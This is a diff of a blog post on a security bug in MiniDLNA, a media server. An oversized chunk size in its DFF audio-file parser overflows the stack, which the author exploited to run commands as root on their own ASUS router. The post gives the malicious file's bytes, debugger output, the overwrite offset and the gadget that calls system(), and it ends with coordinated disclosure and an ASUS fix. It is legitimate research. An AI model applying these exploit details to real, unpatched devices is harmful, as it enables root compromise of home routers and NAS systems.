@@ -1,27 +1,32 @@
 ---
 layout: post
 title: "What DFFuck did you copy? ReadyMedia / MiniDLNA DFF parser unbounded VLA to RCE"
-date: 2026-06-17 14:12 +0200
-description: "Unbounded VLA in ReadyMedia / MiniDLNA's DFF file parser leading to RCE on an ASUS RT-AX86U"
+date: 2026-11-01 00:00 +0200
+description: "Unbounded VLA in ReadyMedia / MiniDLNA's DFF file parser leads to RCE on an ASUS RT-AX86U"
 categories: [Vulnerability Research]
-tags: [MiniDLNA, ReadyMedia, vulnerability-research, CVE-2026-24444]
+tags: [MiniDLNA, ReadyMedia, vulnerability-research, CVE-2026-29508]
 ---
 
 # Intro
 
-Believe it or not, I always wanted to find a memory corruption vulnerability when I started doing vulnerability research, but somehow `grep` was sufficient to achieve RCE. This time I decided to poke at my own router, the [ASUS RT-AX86U](https://www.asus.com/networking-iot-servers/wifi-routers/asus-gaming-routers/rt-ax86u/). The router is running on ARM, which I haven't played with so far, so this looked like a good learning experience. What I've found are multiple vulnerabilities in [ReadyMedia / MiniDLNA](https://sourceforge.net/projects/minidlna/) (not specific to the router itself) which can be exploited to crash the service, obtain sensitive data or achieve remote command execution. The one I chose to further look at and exploit affects the DFF file parsing, and is covered in this blog.
+I always wanted to find a memory corruption vulnerability when I started doing vulnerability research, but somehow `grep password` was sufficient to achieve RCE. This time I decided to poke at my own router, the [ASUS RT-AX86U](https://www.asus.com/networking-iot-servers/wifi-routers/asus-gaming-routers/rt-ax86u/){:target="_blank"}. The router is running on ARM, which I haven't played with so far, so this looked like a good learning experience. 
+
+What I've found are multiple vulnerabilities in [ReadyMedia / MiniDLNA](https://sourceforge.net/projects/minidlna/){:target="_blank"} which can be exploited to crash the service, leak sensitive data, or achieve remote command execution. The one I dug into and exploited on my router hits the DFF file parser.
 
 # About ReadyMedia / MiniDLNA
 
-[ReadyMedia](https://sourceforge.net/projects/minidlna/) (formerly known as MiniDLNA) is a simple media server. It is a lightweight, free piece of software that turns your device into a home media server, streaming your movies, music and photos to a Smart TV, console or phone over Wi-Fi.
+[ReadyMedia](https://sourceforge.net/projects/minidlna/){:target="_blank"} (formerly known as MiniDLNA) is a simple media server. It is a lightweight, free piece of software that turns your device into a home media server, streaming your movies, music and photos to a Smart TV, console or phone.
 
-ReadyMedia / MiniDLNA is available in [repositories](https://repology.org/project/readymedia/packages) for various Linux distributions and is also commonly found on OpenMediaVault, TrueNAS, XigmaNAS, Synology NAS, QNAP NAS, Asustor NAS, Western Digital My Cloud, Wi-Fi routers with USB storage (Asus, Netgear, TP-Link, Linksys, ...), OpenWrt / DD-WRT firmware and others.
+It is available in [repositories](https://pkgs.org/download/minidlna){:target="_blank"} for various Linux distributions (check out the [Cross-Platform Confirmation](#cross-platform-confirmation) section at the end), confirmed present on ASUS, OpenWrt, and DD-WRT firmware; historically bundled as an add-on package on some NAS devices (Synology, QNAP, ReadyNAS).
 
 It is being replaced by better alternatives, but it is still widely present. A quick Shodan search shows its external exposure, but it is far more often exposed only internally.
 
 ![MiniDLNA Shodan Exposure](/assets/img/8/minidlna-exposure-shodan.png)
 
-By default, MiniDLNA listens on port 8200/tcp and is configured via `/etc/minidlna.conf` (on my ASUS router):
+A plain `minidlna` Shodan search returns 48,476 results but that number can't be read as 48,476 vulnerable instances. A quick look at the top hits shows most are running versions well below 1.3.0 (`1.1.4`, `1.0.24`, even `1.0`), which predate the DFF parser entirely and are therefore unaffected by this specific bug. Since the DFF parser only exists in versions 1.3.0 - 1.3.3, the exposure is a narrower subset of that total and drops down to approximately 7,400 instances.
+Also, as you will see, there are prerequisites for exploiting this vulnerability and I only exploited it on the ASUS router.
+
+By default, MiniDLNA listens on port 8200/tcp and is configured via `/etc/minidlna.conf`. Config from my ASUS router:
 
 ```bash
 root@dafuq:/tmp/home/root# netstat -tulnp | grep minidlna | grep LISTEN
@@ -45,18 +50,24 @@ media_dir=/mnt/Toshiba/Downloads
 
 As you can see in the config, it uses `inotify`. Rather than wasting CPU cycles continuously scanning the disk for modifications, MiniDLNA hooks into `inotify`, a native Linux kernel subsystem that watches the filesystem in real time. The moment you drop a new movie or song into a shared folder, `inotify` fires an event, waking MiniDLNA to parse only that one new file and inject its metadata into the database.
 
-I copied the `minidlna` binary from the router to my machine. It is a 32-bit binary running on 64-bit kernel.
+To visualize how your device discovers the ReadyMedia / MiniDLNA service on the network, here is a Wireshark network traffic capture:
+![MiniDLNA Network Traffic](/assets/img/8/minidlna-on-the-network.png)
+
+- Your device uses the Simple Service Discovery Protocol ([SSDP](https://en.wikipedia.org/wiki/Simple_Service_Discovery_Protocol){:target="_blank"}) protocol to discover MiniDLNA on the network via multicast (in this example, I used VLC Media Player to browse the local network).
+- It sends an M-SEARCH discovery packet to the SSDP multicast address (`239.255.255.250:1900` for IPv4, `[FF0x::C]:1900` for IPv6) (bottom-left).
+- The MiniDLNA server replies with a `200 OK` as a unicast reply to the multicast query, containing a `LOCATION` header that points to its device description XML: in this example, `http://192.168.1.1:8200/rootDesc.xml` (bottom-left).
+- Your device then makes an actual HTTP GET request to that `LOCATION` URL and receives the device's metadata (bottom right). Note that the server banner in the response (`Server: 4.1.52 DLNADOC/1.50 UPnP/1.0 MiniDLNA/1.3.3`) displays the exact MiniDLNA version.
+
+I already had an SMB share set up and a USB HDD mounted on the router, so I decided to take a look and copied the `minidlna` binary (32-bit) from the router (64-bit kernel) to my machine. _Note: I chose SMB as an attack vector, but if you want to attack the router via WAN, [AiCloud](https://www.asus.com/content/aicloud/) is your friend._
 
 ```bash
 ➜  minidlna file ./minidlna
 ./minidlna: ELF 32-bit LSB executable, ARM, EABI5 version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.3, for GNU/Linux 4.1.0, stripped
 ```
 
-I already had an SMB share set up and a USB HDD mounted on the router, so I decided to take a look.
-
 # Vulnerability Discovery
 
-I used [Semgrep](https://semgrep.dev) to scan the ReadyMedia / MiniDLNA source which is available [here](https://sourceforge.net/projects/minidlna/files/minidlna/1.3.3/). I will omit all other vulnerabilities that it found, and will leave only relevant information for this blog post.
+I used [Semgrep](https://semgrep.dev){:target="_blank"} to scan the ReadyMedia / MiniDLNA source which is available [here](https://sourceforge.net/projects/minidlna/files/minidlna/1.3.3/){:target="_blank"}. I will omit all other vulnerabilities that it found, and will leave only relevant information for this blog post.
 
 ```bash
 ➜  minidlna-1.3.3 git:(master) semgrep scan
@@ -132,7 +143,7 @@ tagutils/tagutils-dff.c:147:                    while (count < propckDataSize)
 tagutils/tagutils-dff.c:376:    //DPRINTF(E_DEBUG, L_SCANNER, "propckDataSize is 0x%016lx\n", (long unsigned int)propckDataSize);
 ```
 
-For clarity, I think it is best to drop the source of `tagutils-dff.c` here until the vulnerable part of the code:
+For clarity, I think it is best to drop the source of `tagutils-dff.c` here, up to the vulnerable part:
 
 ```c
 //=========================================================================
@@ -285,13 +296,46 @@ _get_dfffileinfo(char *file, struct song_metadata *psong)
 }
 ```
 
-More about the DFF file structure can be found on [Sonic Studio](https://sonicstudio.com/pdf/dsd/DSDIFF_1.5_Spec.pdf).
-
 The code parses the DFF file via the `_get_dfffileinfo` function by first opening the file, `fread`ing the first 32 bytes, and verifying that it contains the appropriate magic chunks, specifically `FRM8`, `DSD`, and `FVER` at offsets 0, 12, and 16.
 
 `fread` now points to the `ckbuf` array, which should start with the `PROP` chunk, as checked on line 125. If it exists, at offset `ckbuf + 4` (right after the `PROP` magic), the code uses the `GET_DFF_INT64` macro to obtain 8 bytes. This macro is used to combine eight separate bytes from a file into a single 64-bit integer. 
 
-At line 130 - it uses the `propckDataSize` size, which is entirely under our control, to create a `propckData` Variable Length Array (VLA) with no bounds checks. Let's check this out.
+At line 130 - it uses the `propckDataSize`, which is entirely under our control, to create a `propckData` Variable Length Array (VLA) with no bounds checks. Let's check this out.
+
+The DFF file structure looks like this:
+
+```bash
+'FRM8'  (root, formType = 'DSD ')                    
+│
+├── 'FVER'  Format Version Chunk                     
+│
+├── 'PROP'  Property Chunk  (propType = 'SND ')      
+│     ├── 'FS  '  Sample Rate Chunk                  
+│     ├── 'CHNL'  Channels Chunk                      
+│     ├── 'CMPR'  Compression Type Chunk              
+│     ├── 'ABSS'  Absolute Start Time Chunk           
+│     └── 'LSCO'  Loudspeaker Config Chunk            
+│
+├── 'DSD '  DSD Sound Data Chunk   ──┐
+├── 'DST '  DST Sound Data Chunk   ──┴─ // either DSD or DST
+│     ├── 'FRTE'  DST Frame Info Chunk               
+│     ├── 'DSTF'  DST Frame Data Chunk                
+│     └── 'DSTC'  DST Frame CRC Chunk                
+│
+├── 'DSTI'  DST Sound Index Chunk                    
+│
+├── 'COMT'  Comments Chunk                            
+│
+├── 'DIIN'  Edited Master Info Chunk                  
+│     ├── 'EMID'  Edited Master ID Chunk              
+│     ├── 'MARK'  Marker Chunk                       
+│     ├── 'DIAR'  Artist Chunk                        
+│     └── 'DITI'  Title Chunk                         
+│
+└── 'MANF'  Manufacturer Specific Chunk               
+```
+
+More about the DFF file structure can be found on [Sonic Studio](https://sonicstudio.com/pdf/dsd/DSDIFF_1.5_Spec.pdf){:target="_blank"}.
 
 First I created a valid DFF file:
 
@@ -307,7 +351,7 @@ user@ubuntu:~ hexdump -C dff-input/sample.dff
 0000006f
 ```
 
-Then I changed the PROP chunk size to good old `0x41414141` (1094795585 in decimal):
+Then I changed the PROP chunk size to good old `0x41414141` (1094795585 in decimal, ~1GB):
 ![DFF POC 1](/assets/img/8/minidlna-dff-poc-1.png)
 
 Copied it over to my SMB file share, and looked at the `dmesg` output on my router:
@@ -344,14 +388,13 @@ SIGSEGV!
 # Vulnerability analysis
 
 So, the prerequisites to crash the service are:
-- ReadyMedia / MiniDLNA has to be network-reachable
-- SMB service needs to be network-reachable
-- user that has permissions to write to a SMB share
+- SMB service needs to be network-reachable (LAN attack vector) / AiCloud enabled (WAN attack vector)
+- user that has permissions to write via an SMB share / AiCloud
 - a DFF file with an oversized PROP Chunk Size
 
 Until that day, I never really looked at ARM instructions nor did I have any experience with ARM exploitation. But registers are registers, memory is memory, instructions are instructions.
 
-First, let's check the binary protections. For this I used [ExeCheck](https://github.com/kost/execheck) from my colleague Kost.
+First, let's check the binary protections. For this I used [ExeCheck](https://github.com/kost/execheck){:target="_blank"} from my colleague Kost.
 
 ```bash
 root@dafuq:/tmp/home/root# ./execheck-aarch64-unknown-linux-musl /usr/sbin/minidlna
@@ -391,7 +434,13 @@ root@dafuq:/tmp/home/root# cat /proc/sys/kernel/randomize_va_space
 
 Well, that is not nice. That means full ASLR - stack, heap, and mmap (libraries) are all randomized, and I do not have any information disclosure vulnerabilities that would leak some memory addresses. The one thing it doesn't touch is the base of a non-PIE binary like this one: its code, PLT and any gadgets stay at fixed addresses.
 
-I copied over `gdb-static` and modified the poc.dff file a bit - added a bunch of `0x41`s in the file to see how that would affect the registers, and set the PROP Chunk size to `0xFFFFFFFF`.
+I copied over `gdb-static` and modified the poc.dff file a bit by adding a bunch of `0x41`s in the file to see how that would affect the registers, and set the PROP Chunk size to `0xFFFFFFFF`. So, why `0xFFFFFFFF`? While trying to exploit the vulnerability it just seemed to work reliably. But it did bug me why this worked, specifically? I didn't actually get it until I sat down to write this blog post.
+
+Every time the program needs space for something, it keeps a running count of how much room is left, like an odometer with a fixed number of digits. Ask for space, and the counter ticks down. Ask for more space than the counter can actually represent, though, and instead of going negative, it wraps back around near the top, the same way an odometer rolls from all-9s back to zero. Our "odometer" is the stack pointer `sp`. `sp` is a 32-bit register, so it can only hold values from `0` up to `0xFFFFFFFF` (4,294,967,295 in decimal). That's the entire range, every bit set to 1. `0xFFFFFFFF` isn't just "a big number close to the wraparound point", it *is* the wraparound point.
+
+That's the difference between my two test values. `0x41414141` is a big number, but not big enough to hit that wraparound point, so the program just tries to grab about 1 GB of space and crashes the boring, ordinary way and nothing interesting happens. `0xFFFFFFFF` is the exact number that makes this particular counter wrap all the way back. That's the number that turns an ordinary out-of-memory crash into the actual bug: the program thinks it reserved almost no space on the stack, while still believing it's allowed to write nearly 4 GB of data.
+
+The other thing is that `fread()` call (at line 132) sounds like it only "reads," but reading and writing are two sides of the same call. `fread(dest, size, count, file)` reads bytes from the file, and writes them into `dest` buffer in memory.
 
 ![DFF POC2](/assets/img/8/minidlna-dff-poc-2.png)
 
@@ -409,7 +458,6 @@ Attaching to process 24141
 0xf6c45728 in select () from /lib/libc.so.6
 (gdb) c
 Continuing.
-
 Thread 2 "minidlna" received signal SIGSEGV, Segmentation fault.
 [Switching to LWP 24143]
 0xf6bf172e in strlen () from /lib/libc.so.6
@@ -420,7 +468,7 @@ Thread 2 "minidlna" received signal SIGSEGV, Segmentation fault.
 * 2    LWP 24143 "minidlna" 0xf6bf172e in strlen ()
    from /lib/libc.so.6
 (gdb) info reg
-r0             0x41414141          1094795585
+r0             0xffffffff          4294967295
 r1             0x41414140          1094795584
 r2             0x1                 1
 r3             0x0                 0
@@ -460,7 +508,6 @@ Attaching to process 16727
   2    LWP 16728 "minidlna" 0xf6b1337c in poll () from /lib/libc.so.6
 (gdb) c
 Continuing.
-
 Thread 2 "minidlna" received signal SIGILL, Illegal instruction.
 [Switching to LWP 16728]
 0x42424242 in ?? ()
@@ -504,7 +551,7 @@ Type "help", "copyright", "credits" or "license" for more information.
 >>> len("000000004141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414142424242")
 1968
 ```
-1968 hex characters. So, 984 bytes land before the `pc` overwrite. That's the offset I need from the start of the PROP chunk data. More padding?
+1968 / 2 (to convert to bytes) - 4 (to take the 0x42424242 off the count) = 980. So, 980 bytes land before the `pc` overwrite. That's the offset I need from the start of the PROP chunk data. More padding? Let's add a bunch of `0x43`'s after the `$pc` overwrite. 
 
 ```bash
 root@dafuq:/tmp/mnt/Toshiba/Downloads/Tools/gdb# minidlna && ./gdb -q --pid $(pidof minidlna)
@@ -517,9 +564,9 @@ Attaching to process 24389
 
 ⚠️ warning: Unable to find libthread_db matching inferior's thread library, thread debugging will not be available.
 0xf690d728 in select () from /lib/libc.so.6
+
 (gdb) c
 Continuing.
-
 Thread 2 "minidlna" received signal SIGILL, Illegal instruction.
 [Switching to LWP 24391]
 0x42424242 in ?? ()
@@ -701,7 +748,7 @@ Start Addr End Addr   Size       Offset     Perms File
 ...
 ```
 
-Since the stack grows downward and `propckDataSize` is attacker-controlled, the VLA subtracts a value of my choosing from `sp`, walking it far down through the thread's stack mapping (capped at ~4 GiB, since size_t is 32-bit), far enough to land it on the bytes I planted. To summarize: I have control over the `$pc`, `$r0` and `$r4-$r11` registers.
+Since the stack grows downward and `propckDataSize` is attacker-controlled, the VLA subtracts a value of my choosing from `sp`, walking it far down through the thread's stack mapping (capped at ~4 GiB, since size_t is 32-bit). To summarize: I have control over the `$pc`, `$r0` and `$r4-$r11` registers.
 
 To confirm where it actually breaks, I rebuilt MiniDLNA with debug symbols and ran it under `pwndbg` on a Raspberry Pi:
 
@@ -814,12 +861,11 @@ Thread 2 "minidlna" hit Breakpoint 1.2, 0xf6d6396c in system ()  // [1] we hit t
    from /lib/libpthread.so.0
 (gdb) x $r0
 0xffffffff: ❌️ Cannot access memory at address 0xffffffff
-(gdb)
 ```
 
-Bingo. However, I ran into an issue - the `$r0` register is used as argument to the `system()` function (`system(const char *command);`), and the `$r0` register contains the PROP Chunk Size. If I modify that, the process might not crash. Also, NX is enabled so I need to find ROP gadgets. The gadget I need needs to put something I have control over (stack, `$r4-$r11`) into the `$r0` register.
+Bingo. However, I ran into an issue - the `$r0` register is used as argument to the `system()` function (`system(const char *command);`), and the `$r0` register contains the PROP Chunk Size. Also, NX is enabled so I need to find ROP gadgets. The gadget I need needs to put something I have control over (stack, `$r4-$r11`) into the `$r0` register.
 
-I used [ROPgadget](https://github.com/jonathansalwan/ropgadget) for this, but I did not find any gadgets that would help me. And then, once again, I decided to use `grep` and look around the `system()` call.
+I used [ROPgadget](https://github.com/jonathansalwan/ropgadget){:target="_blank"} for this, but I did not find any gadgets that would help me. And then, once again, I decided to use `grep` and look around the `system()` call.
 
 Look at this bad boy:
 
@@ -832,7 +878,7 @@ Look at this bad boy:
    156f0: ebfff873      bl  0x138c4 <system@plt>    @ imm = #-0x1e34
 ```
 
-This little snippet loads `$r0` with a pointer 8 bytes ahead of the stack pointer and then falls straight into `system@plt` Let's modify the PoC DFF file.
+This little snippet loads `$r0` with a pointer 8 bytes ahead of the stack pointer and then falls straight into `system@plt`. Let's modify the PoC DFF file.
 
 ![DFF POC 4](/assets/img/8/minidlna-dff-poc-4.png)
 
@@ -897,7 +943,7 @@ Thread 2 "minidlna" hit Breakpoint 1.2, 0xf6e0996c in system ()
 
 Nice. Now `$r0` holds the memory address of `$sp+8`, and I have control over the contents. Time to get a shell.
 
-As the prerequisite is to have write access to a SMB share - I can already transfer all the binaries I need, as ASUS router does not have any I can use out of the box to get a reverse shell (at least from my experiments). I have command execution as root (as I can put any command on the stack which `system()` will execute), but a shell is a shell.
+As the prerequisite is to have write access via an SMB share / AiCloud - I can already transfer all the binaries I need, as ASUS router does not have any I can use out of the box to get a reverse shell (at least from my experiments). I have command execution as root (as I can put any command on the stack which `system()` will execute), but a shell is a shell.
 
 By default, the ASUS router mounts external devices to `/tmp/mnt`, so I opted for this payload:
 
@@ -906,7 +952,7 @@ By default, the ASUS router mounts external devices to `/tmp/mnt`, so I opted fo
 It will `find` the copied `netcat` binary in `/tmp/mnt`, run it with the arguments I baked into the DFF file, and then restart minidlna, as it SIGSEGVs right after the payload fires, and I didn't bother making it stable post-exploitation.
 
 ```bash
-➜  minidlna mount | grep Downloads
+➜  mini mount | grep Downloads
 //shareuser@192.168.1.1/Downloads on /Volumes/Downloads (smbfs, nodev, nosuid, mounted by user)
 ```
 
@@ -924,19 +970,122 @@ root@dafuq:/tmp/home/root# nvram get firmver
 9.0.0.4
 ```
 
+# Cross-Platform Confirmation
+
+Since ReadyMedia / MiniDLNA ships identically across a dozen platforms, I spun up the same MiniDLNA 1.3.3 codebase in Docker across six distributions to confirm the DFF parser crash. 
+
+Same PoC file everywhere:
+
+```bash
+00000000  46 52 4d 38 00 00 00 00 00 00 10 00 44 53 44 20  |FRM8........DSD |
+00000010  46 56 45 52 00 00 00 00 00 00 00 04 01 05 00 00  |FVER............|
+00000020  50 52 4f 50 00 00 00 02 00 00 00 00              |PROP........|
+```
+
+A minimal `FRM8`/`DSD `/`FVER` header followed by a `PROP` chunk with `ckDataSize = 0x0000000200000000` (~8 GB).
+
+#### Ubuntu 24.04 (minidlna 1.3.3, apt)
+
+```bash
+[Sat Jun 13 12:42:32 2026] minidlnad[3514]: segfault at 7ffeffa96568 ip 00005622f9d5313a sp 00007ffeffa95570 error 6 in minidlnad[2e13a,5622f9d2e000+2e000] likely on CPU 1 (core 1, socket 0)
+```
+
+I also rebuilt this one from source with debug symbols and caught it live in gdb:
+
+```bash
+Thread 2 "minidlnad" received signal SIGSEGV, Segmentation fault.
+[Switching to Thread 0x7f15a5e526c0 (LWP 11038)]
+0x000055cd1fe70348 in _get_dfffileinfo (file=0x7f15a5e48560 "/media/poc.dff", psong=0x7f15a5e47010) at tagutils/tagutils-dff.c:130
+130			unsigned char propckData[propckDataSize];
+#0  0x000055cd1fe70348 in _get_dfffileinfo (...) at tagutils/tagutils-dff.c:130
+        propckDataSize = 8589934592
+        totalcount = 8589934604
+        ckbuf = "PROP\000\000\000\002\000\000\000"
+#1  0x000055cd1fe71fd7 in _get_fileinfo (...) at tagutils/tagutils.c:204
+#2  0x000055cd1fe722ef in readtags (...) at tagutils/tagutils.c:304
+#3  0x000055cd1fe5785a in GetAudioMetadata (...) at metadata.c:380
+#4  0x000055cd1fe5dcf3 in insert_file (...) at scanner.c:486
+#5  0x000055cd1fe603e5 in monitor_insert_file (...) at monitor.c:257
+#6  0x000055cd1fe737d7 in inotify_thread (arg=0x0) at monitor_inotify.c:357
+#7  0x00007f15b049cb84 in start_thread (...) at ./nptl/pthread_create.c:447
+#8  0x00007f15b0529cc4 in clone () at ../sysdeps/unix/sysv/linux/x86_64/clone.S:100
+
+rax            0x200000000         8589934592
+rcx            0x200000000         8589934592
+rip            0x55cd1fe70348      0x55cd1fe70348 <_get_dfffileinfo+1379>
+```
+
+Same call chain as the ARM backtrace above: `inotify_thread` -> `monitor_insert_file` -> `insert_file` -> `GetAudioMetadata` -> `readtags` -> `_get_dfffileinfo`.
+
+#### Debian 12 (minidlna 1.3.3, apt)
+
+```bash
+--- SIGSEGV {si_signo=SIGSEGV, si_code=SEGV_MAPERR, si_addr=0x7ffb0c871268} ---
++++ killed by SIGSEGV +++
+--- SIGCHLD {si_signo=SIGCHLD, si_code=CLD_KILLED, si_pid=2153, si_uid=0, si_status=SIGSEGV, si_utime=0, si_stime=0} ---
+```
+
+#### Fedora 44 (minidlna 1.3.3, dnf)
+
+```bash
+--- SIGSEGV {si_signo=SIGSEGV, si_code=SEGV_MAPERR, si_addr=0x7ffccecf0f28} ---
++++ killed by SIGSEGV +++
+--- SIGCHLD {si_signo=SIGCHLD, si_code=CLD_KILLED, si_pid=1432, si_uid=0, si_status=SIGSEGV, si_utime=0, si_stime=0} ---
+```
+
+#### Arch Linux (minidlna 1.3.3-7, pacman)
+
+```bash
+--- SIGSEGV {si_signo=SIGSEGV, si_code=SEGV_MAPERR, si_addr=0x7ffc1965a688} ---
++++ killed by SIGSEGV +++
+--- SIGCHLD {si_signo=SIGCHLD, si_code=CLD_KILLED, si_pid=1183, si_uid=0, si_status=SIGSEGV, si_utime=0, si_stime=0} ---
+```
+
+#### Alpine Linux (minidlna 1.3.3-r3, apk)
+
+```bash
+open("/media/poc.dff", O_RDONLY|O_LARGEFILE) = 4
+readv(4, [{iov_base="FRM8\0\0\0\0\0\0\20\0DSD FVER\0\0\0\0\0\0\0\4\1\5\0", iov_len=31}, {iov_base="\0PROP\0\0\0\2\0\0\0\0", iov_len=1024}], 2) = 44
+--- SIGSEGV {si_signo=SIGSEGV, si_code=SEGV_MAPERR, si_addr=0x7fff1dff4708} ---
++++ killed by SIGSEGV +++
+--- SIGCHLD {si_signo=SIGCHLD, si_code=CLD_KILLED, si_pid=29, si_uid=0, si_status=SIGSEGV, si_utime=0, si_stime=0} ---
+```
+
+#### Raspbian 11 (compiled from the source with debug symbols)
+
+```bash
+pwndbg> bt
+#0  __GI__IO_fread (buf=0x2d18f3f0, size=1094795585, count=1, fp=0x6dc00aa0) at iofread.c:32
+#1  0x00049d24 in _get_dfffileinfo (file=0x6e5a54d8 "/dev/shm/Downloads/poc1.dff", psong=0x6e5a40ac) at tagutils/tagutils-dff.c:132
+#2  0x0004d490 in _get_fileinfo (file=0x6e5a54d8 "/dev/shm/Downloads/poc1.dff", psong=0x6e5a40ac) at tagutils/tagutils.c:204
+#3  0x0004d804 in readtags (path=0x6e5a54d8 "/dev/shm/Downloads/poc1.dff", psong=0x6e5a40ac, stat=0x6e5a41b0, lang=0x780d8 <lang> "en_GB",
+    type=0x6e5a4218 "dff") at tagutils/tagutils.c:304
+#4  0x00030e08 in GetAudioMetadata (path=0x6e5a54d8 "/dev/shm/Downloads/poc1.dff", name=0x6dc012e8 "poc1.dff") at metadata.c:380
+#5  0x00037710 in insert_file (name=0x6dc012e8 "poc1.dff", path=0x6e5a54d8 "/dev/shm/Downloads/poc1.dff", parentID=0x6dc01962 "", object=0,
+    types=7 '\a') at scanner.c:486
+#6  0x00039c90 in monitor_insert_file (name=0x6dc012e8 "poc1.dff", path=0x6e5a54d8 "/dev/shm/Downloads/poc1.dff") at monitor.c:257
+#7  0x0004ed74 in inotify_thread (arg=0x0) at monitor_inotify.c:357
+#8  0x76805310 in start_thread (arg=0x6e5aeb00) at pthread_create.c:477
+#9  0x767875d8 in ?? () at ../sysdeps/unix/sysv/linux/arm/clone.S:73 from /lib/arm-linux-gnueabihf/libc.so.6
+```
+
+I tried exploiting the vulnerability on Ubuntu, but I could not corrupt anything. I only had a reliable crash. If you pull MiniDLNA 1.3.3 from Ubuntu's apt repo, you get a binary hardened with PIE, full RELRO, stack canaries, FORTIFY_SOURCE, and `-fstack-clash-protection`. 
+
+On other embedded/router-class builds without these mitigations, this memory corruption can lead to code execution. On anything built with a modern, default-hardened toolchain, it degrades to a denial-of-service condition. But that is just my experience.
+
 # References
 
-- TODO
-- TODO
-- TODO
+- [VulnCheck](https://www.vulncheck.com/advisories/minidlna-unbounded-vla-to-rce){:target="_blank"}
+- [ASUS Security Advisory](https://www.asus.com/security-advisory#bulletins){:target="_blank"}
+- [ASUS Firmware Update 3.0.0.4.388_24437](https://www.asus.com/networking-iot-servers/wifi-routers/asus-gaming-routers/rt-ax86u/helpdesk_bios?model2Name=RT-AX86-Series-RT-AX86U-RT-AX86S)
+- [ASUS Hall of Fame](https://www.asus.com/security-advisory#hof){:target="_blank"}
+- [NIST](https://nvd.nist.gov/vuln/detail/cve-2026-29508){:target="_blank"}
 
 # Outro
 
-What started as me poking at my own router ended up as my first ARM memory corruption bug.
+I reported the vulnerability through [VulnCheck](https://vulncheck.com){:target="_blank"} in March, who handled the coordination. ASUS was responsive, and over the following months they sent me several firmware builds to test, and I kept throwing my PoCs at each one until the vulnerability was properly fixed by adding a bounds check for the Property chunk size.
 
-I reported the vulnerability through [VulnCheck](https://vulncheck.com), who handled the coordination. ASUS was responsive, and over the following weeks they sent me a several firmware builds to test, and I kept throwing my PoC's at each one until the issues were properly fixed.
-
-One thing worth keeping in mind: this vulnerabilities I discovered live in ReadyMedia / MiniDLNA itself, not in the ASUS firmware. Unfortunatelly, the ReadyMedia / MiniDLNA maintainers did not respond. The same vulnerable code still ships in plenty of Linux distributions and NAS appliances. I did not check whether it's exploitable there. The binary protections, libc, and stack layout differ from target to target, so what gave me code execution here, might land you a plain DoS somewhere else (or nothing at all). If you have a vulnerable box lying around, it might be a fun afternoon.
+What started as me poking at my own router ended up as my first memory corruption bug and I've learned a lot in the process.
 
 0x41414141 the planet!
 
